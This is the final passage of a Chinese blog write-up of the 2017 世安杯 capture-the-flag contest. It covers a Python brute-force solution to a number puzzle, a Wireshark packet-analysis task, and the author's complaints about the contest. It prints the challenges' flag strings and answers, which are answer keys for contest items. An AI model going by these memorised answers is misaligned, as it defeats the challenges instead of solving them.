<img src="/2017/10/09/世安杯-WriteUp/15-49-13.jpg" alt="15-49-13.jpg" title="">
<img src="/2017/10/09/世安杯-WriteUp/15-49-20.jpg" alt="15-49-20.jpg" title="">
<p><code>flag{4f7548f93c7bef1dc6a0542cf04e796e}</code></p>
<h5 id="珍妮的qq号"><a href="#珍妮的qq号" class="headerlink" title="珍妮的qq号"></a>珍妮的qq号</h5><p>不解释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">珍妮换了一个新的QQ号码，原来的号码和新的号码都是5位靓号哦；其次，新的号码是原来号码的4倍，并且原来的号码倒着写正好是新的号码，请问，新号码是多少，新号码即为key。</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">99999</span>):</div><div class="line">    <span class="keyword">if</span> str(i).zfill(<span class="number">5</span>)== str(<span class="number">4</span>*i).zfill(<span class="number">5</span>)[::<span class="number">-1</span>]:</div><div class="line">        <span class="keyword">print</span> <span class="number">4</span>*i</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure>
<p><code>87912</code></p>
<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>分析数据包的题<br>提示是<code>小黑在拿到webshell后，马上就获得了自己心仪公司的照片</code><br>猜测就是找http包然后分析包含照片的信息<br>用wireshark打开包，过滤出http协议的包，不一会就能找到图片中的flag</p>
<p><img src="/2017/10/09/世安杯-WriteUp/15-59-10.jpg" alt="15-59-10.jpg" title=""><code>fl4g:{ftop_Is_Waiting_4_y}</code></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>先让我吐槽一下――<strong>辣鸡比赛</strong><br><strong>这是一个不尊重参赛者的比赛</strong><br>连flag也不改，题目都是原题，选择题宕机最后半小时又开启说要算分(当时我直接无视了)，以及决赛还要自带干粮(这个不能忍！)<br>所以是果断地拒绝了参加决赛，纯当练手了</p>
<p><strong>感悟：</strong></p>
<blockquote>
<ul>
<li>少参加类似的技术含量低的比赛(除非实在闲得慌)</li>
<li>逆向要加强，汇编、动态调试、加花混淆、防动调等</li>
<li>多运动，做一天的题，累得慌</li>
</ul>
</blockquote>
<p><strong>感谢阅读</strong></p>

      
    </div>
    
    
    
	<div>
	  
		<div>
    
		<br>
		</br>
        <div style="text-align:center;color: #ccc;font-size:14px">----- 感谢阅读 -----<br></br></div>
    
</div>
	  
	</div>
    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/09/29/滴滴实习生面经/" rel="next" title="滴滴实习生面经">
                <i class="fa fa-chevron-left"></i> 滴滴实习生面经
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/10/16/用C实现磁盘分析/" rel="prev" title="用C实现磁盘分析">
                用C实现磁盘分析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">W z</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">25</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/testzero-wz" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:testzero.wz@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-google"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number"></span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ctf入门级题目"><span class="nav-number">0.1.</span> <span class="nav-text">ctf入门级题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#曲奇"><span class="nav-number">0.2.</span> <span class="nav-text">曲奇</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#类型"><span class="nav-number">0.3.</span> <span class="nav-text">类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#登录"><span class="nav-number">0.4.</span> <span class="nav-text">登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#admin"><span class="nav-number">0.5.</span> <span class="nav-text">admin</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向"><span class="nav-number"></span> <span class="nav-text">逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#console"><span class="nav-number">0.1.</span> <span class="nav-text">console</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐写"><span class="nav-number"></span> <span class="nav-text">隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#low"><span class="nav-number">0.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#斑马斑马"><span class="nav-number">0.2.</span> <span class="nav-text">斑马斑马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CreateByWho"><span class="nav-number">0.3.</span> <span class="nav-text">CreateByWho</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#适合作为桌面的图片"><span class="nav-number">0.3.1.</span> <span class="nav-text">适合作为桌面的图片</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number"></span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ReverseMe"><span class="nav-number">0.1.</span> <span class="nav-text">ReverseMe</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#珍妮的qq号"><span class="nav-number">0.1.1.</span> <span class="nav-text">珍妮的qq号</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell"><span class="nav-number">0.2.</span> <span class="nav-text">webshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">W z</span>

  
</div>


<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>




  <span class="post-meta-divider">|</span>



<div class="powered-by">
 桂ICP备17008880号
 </div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="https://cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/velocity/1.2.1/velocity.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/velocity/1.2.1/velocity.ui.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
